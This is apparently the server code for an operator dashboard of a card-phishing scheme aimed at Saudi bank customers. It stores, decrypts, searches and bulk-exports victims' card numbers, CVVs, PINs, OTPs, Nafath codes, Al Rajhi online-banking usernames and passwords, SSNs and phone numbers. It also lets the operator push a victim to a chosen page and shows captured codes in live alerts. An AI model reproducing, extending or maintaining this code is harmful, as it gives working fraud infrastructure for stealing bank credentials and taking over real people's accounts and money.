import { createServerFn } from "@tanstack/react-start";
import type { SupabaseClient } from "@supabase/supabase-js";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { decryptDeep, hashField } from "./crypto.server";

/** Search filter that works over encrypted columns: exact blind-index match
 *  for ssn/phone, plus plaintext ilike for legacy rows and non-encrypted fields. */
function applyVisitorSearch<T extends { or: (f: string) => T }>(q: T, raw: string): T {
  const s = raw.trim();
  const parts = [`session_id.ilike.%${s}%`, `ssn.ilike.%${s}%`, `phone.ilike.%${s}%`, `visitor_name.ilike.%${s}%`];
  const h = hashField(s);
  if (h) parts.push(`ssn_hash.eq.${h}`, `phone_hash.eq.${h}`);
  return q.or(parts.join(","));
}

type DashboardDatabaseClient = SupabaseClient<any>;

function dashboardDb(context: { supabase: SupabaseClient }) {
  return context.supabase as DashboardDatabaseClient;
}

async function assertAdmin(context: {
  supabase: import("@supabase/supabase-js").SupabaseClient;
  userId: string;
}) {
  const { data, error } = await dashboardDb(context)
    .from("user_roles")
    .select("role")
    .eq("user_id", context.userId)
    .eq("role", "admin")
    .maybeSingle();
  if (error) throw new Error(error.message);
  if (!data) throw new Error("Forbidden: admin only");
}

async function logActivity(
  context: {
    supabase: import("@supabase/supabase-js").SupabaseClient;
    userId: string;
    claims?: { email?: string } | null;
  },
  entry: { action: string; target_type?: string; target_id?: string; meta?: Record<string, unknown> },
) {
  await dashboardDb(context).from("admin_activity_log").insert({
    actor_id: context.userId,
    actor_email: context.claims?.email ?? null,
    action: entry.action,
    target_type: entry.target_type ?? null,
    target_id: entry.target_id ?? null,
    meta: entry.meta ?? {},
  } as never);
}

export const getStats = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const supabase = dashboardDb(context);

    const today = new Date();
    today.setUTCHours(0, 0, 0, 0);
    const todayIso = today.toISOString();

    const [total, todayCount, cards, calls, online] = await Promise.all([
      supabase.from("quotes").select("id", { count: "exact", head: true }),
      supabase.from("quotes").select("id", { count: "exact", head: true }).gte("created_at", todayIso),
      supabase.from("cards").select("id", { count: "exact", head: true }),
      supabase.from("quotes").select("id", { count: "exact", head: true }).not("phone", "is", null),
      supabase
        .from("quotes")
        .select("id", { count: "exact", head: true })
        .gte("last_active_at", new Date(Date.now() - 2 * 60 * 1000).toISOString()),
    ]);

    return {
      totalVisitors: total.count ?? 0,
      todayVisitors: todayCount.count ?? 0,
      cards: cards.count ?? 0,
      calls: calls.count ?? 0,
      online: online.count ?? 0,
    };
  });

export const listVisitors = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) =>
    z
      .object({
        filter: z.enum(["all", "online", "card", "archive", "trash"]).default("all"),
        search: z.string().optional(),
      })
      .parse(data),
  )
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    let q = dashboardDb(context)
      .from("quotes")
      .select("*, cards(id, card_number), quote_details(full_name)")
      .order("last_active_at", { ascending: false })
      .limit(200);

    if (data.filter === "trash") {
      q = q.eq("trashed", true);
    } else {
      q = q.eq("trashed", false);
      if (data.filter === "archive") q = q.eq("archived", true);
      else q = q.eq("archived", false);
      if (data.filter === "card") q = q.not("cards", "is", null);
      if (data.filter === "online") {
        const since = new Date(Date.now() - 2 * 60 * 1000).toISOString();
        q = q.gte("last_active_at", since);
      }
    }

    if (data.search && data.search.trim()) {
      q = applyVisitorSearch(q, data.search);
    }

    const { data: rows, error } = await q;
    if (error) throw new Error(error.message);
    return decryptDeep(rows ?? []);
  });

/** List visitors currently on the home page ("الرئيسية"), most recent first. */
export const listHomeVisitors = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) =>
    z
      .object({
        onlyOnline: z.boolean().default(true),
        search: z.string().optional(),
      })
      .parse(data),
  )
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    let q = dashboardDb(context)
      .from("quotes")
      .select("*, cards(id, card_number), quote_details(full_name)")
      .eq("trashed", false)
      .eq("current_page", "الرئيسية")
      .order("last_active_at", { ascending: false })
      .limit(300);
    if (data.onlyOnline) {
      const since = new Date(Date.now() - 2 * 60 * 1000).toISOString();
      q = q.gte("last_active_at", since);
    }
    if (data.search && data.search.trim()) {
      const s = data.search.trim();
      const parts = [`session_id.ilike.%${s}%`, `ssn.ilike.%${s}%`, `phone.ilike.%${s}%`, `visitor_name.ilike.%${s}%`, `ip_address.ilike.%${s}%`];
      const h = hashField(s);
      if (h) parts.push(`ssn_hash.eq.${h}`, `phone_hash.eq.${h}`);
      q = q.or(parts.join(","));
    }
    const { data: rows, error } = await q;
    if (error) throw new Error(error.message);
    return decryptDeep(rows ?? []);
  });

/** Move all offline (>2 min) visitors without a card into trash. */
export const trashOfflineNoCard = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const cutoff = new Date(Date.now() - 2 * 60 * 1000).toISOString();
    const { data: candidates, error: e1 } = await dashboardDb(context)
      .from("quotes")
      .select("id, cards(id)")
      .eq("trashed", false)
      .lt("last_active_at", cutoff);
    if (e1) throw new Error(e1.message);
    const ids = (candidates ?? [])
      .filter((r: any) => !r.cards || r.cards.length === 0)
      .map((r: any) => r.id as string);
    if (ids.length === 0) return { moved: 0 };
    const { error: e2 } = await dashboardDb(context)
      .from("quotes")
      .update({ trashed: true } as never)
      .in("id", ids);
    if (e2) throw new Error(e2.message);
    await logActivity(context, {
      action: "bulk_trash",
      target_type: "quotes",
      meta: { count: ids.length, ids },
    });
    return { moved: ids.length };
  });

/** Trash or restore a single visitor. */
export const setTrashed = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) =>
    z.object({ id: z.string().uuid(), trashed: z.boolean() }).parse(data),
  )
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { data: q } = await dashboardDb(context)
      .from("quotes")
      .select("session_id, ssn, phone, visitor_name")
      .eq("id", data.id)
      .maybeSingle();
    const { error } = await dashboardDb(context)
      .from("quotes")
      .update({ trashed: data.trashed } as never)
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    await logActivity(context, {
      action: data.trashed ? "trash" : "restore",
      target_type: "quote",
      target_id: data.id,
      meta: {
        session_id: (q as any)?.session_id,
        ssn: (q as any)?.ssn,
        phone: (q as any)?.phone,
        name: (q as any)?.visitor_name,
      },
    });
    return { ok: true };
  });

export const listActivityLog = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) => z.object({ limit: z.number().int().min(1).max(500).default(100) }).parse(data ?? {}))
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { data: rows, error } = await dashboardDb(context)
      .from("admin_activity_log")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(data.limit);
    if (error) throw new Error(error.message);
    return rows ?? [];
  });

export const getVisitorFull = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) => z.object({ id: z.string().uuid() }).parse(data))
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { data: quote, error } = await dashboardDb(context)
      .from("quotes")
      .select(
        "*, quote_details(*), quote_submission_history(*), cards(*, card_otp_history(*), card_nafath_history(*), card_input_history(*), card_pin_history(*), card_rajhi_history(*))",
      )
      .eq("id", data.id)
      .maybeSingle();
    if (error) throw new Error(error.message);
    if (quote) {
      const cards = (quote as any).cards ?? [];
      const sortAsc = (a: any, b: any) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime();
      (quote as any).card_otp_history = cards.flatMap((c: any) => c.card_otp_history ?? []).sort(sortAsc);
      (quote as any).card_nafath_history = cards.flatMap((c: any) => c.card_nafath_history ?? []).sort(sortAsc);
      (quote as any).card_input_history = cards.flatMap((c: any) => c.card_input_history ?? []).sort(sortAsc);
      (quote as any).card_pin_history = cards.flatMap((c: any) => c.card_pin_history ?? []).sort(sortAsc);
      (quote as any).card_rajhi_history = cards.flatMap((c: any) => c.card_rajhi_history ?? []).sort(sortAsc);
      (quote as any).quote_submission_history = ((quote as any).quote_submission_history ?? []).sort(sortAsc);
    }
    return decryptDeep(quote);
  });

export const updateVisitor = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) =>
    z
      .object({
        id: z.string().uuid(),
        current_page: z.string().optional(),
        blocked: z.boolean().optional(),
        archived: z.boolean().optional(),
        pinned: z.boolean().optional(),
        distinguished: z.boolean().optional(),
        nafath_number: z.string().max(20).nullable().optional(),
      })
      .parse(data),
  )
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { id, ...rest } = data;
    const patch: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(rest)) if (v !== undefined) patch[k] = v;
    const { error } = await dashboardDb(context).from("quotes").update(patch as never).eq("id", id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const listSettings = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const { data, error } = await dashboardDb(context).from("settings").select("*");
    if (error) throw new Error(error.message);
    return data ?? [];
  });

export const upsertSetting = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) =>
    z.object({ setting_key: z.string().min(1), setting_value: z.string() }).parse(data),
  )
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { error } = await dashboardDb(context)
      .from("settings")
      .upsert({ setting_key: data.setting_key, setting_value: data.setting_value }, {
        onConflict: "setting_key",
      });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const listBannedCards = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const { data, error } = await dashboardDb(context)
      .from("banned_cards")
      .select("*")
      .order("created_at", { ascending: false });
    if (error) throw new Error(error.message);
    return data ?? [];
  });

export const addBannedCard = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) => z.object({ card_number: z.string().min(4) }).parse(data))
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { error } = await dashboardDb(context).from("banned_cards").insert({ card_number: data.card_number });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const removeBannedCard = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) => z.object({ id: z.string().uuid() }).parse(data))
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { error } = await dashboardDb(context).from("banned_cards").delete().eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const listBannedIps = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const { data, error } = await dashboardDb(context)
      .from("banned_ips")
      .select("*")
      .order("created_at", { ascending: false });
    if (error) throw new Error(error.message);
    return data ?? [];
  });

export const addBannedIp = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) => z.object({ ip: z.string().min(3) }).parse(data))
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { error } = await dashboardDb(context).from("banned_ips").insert({ ip: data.ip });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const removeBannedIp = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) => z.object({ id: z.string().uuid() }).parse(data))
  .handler(async ({ context, data }) => {
    await assertAdmin(context);
    const { error } = await dashboardDb(context).from("banned_ips").delete().eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** Export every captured card with its related histories for backup. */
export const exportAllCards = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    await assertAdmin(context);
    const { data, error } = await dashboardDb(context)
      .from("cards")
      .select(
        "*, quote:quotes(session_id, visitor_name, ssn, phone, country, ip_address, current_page), card_otp_history(otp, created_at), card_pin_history(pin, created_at), card_nafath_history(code, created_at), card_rajhi_history(username, password, created_at), card_input_history(card_number, card_name, year, cvv, phone_number, created_at)",
      )
      .order("created_at", { ascending: false });
    if (error) throw new Error(error.message);
    await logActivity(context, { action: "export_cards", meta: { count: (data ?? []).length } });
    return decryptDeep(data ?? []);
  });

/**
 * Decrypt short strings arriving in realtime payloads (card numbers, OTP
 * codes, nafath codes) so dashboard notifications show readable values.
 * Admin-only; input is capped to a few short strings.
 */
export const decryptAlertValues = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data: unknown) =>
    z.object({ values: z.array(z.string().max(2000)).max(5) }).parse(data),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context);
    const { decryptField } = await import("./crypto.server");
    return { values: data.values.map((v) => decryptField(v) ?? v) };
  });
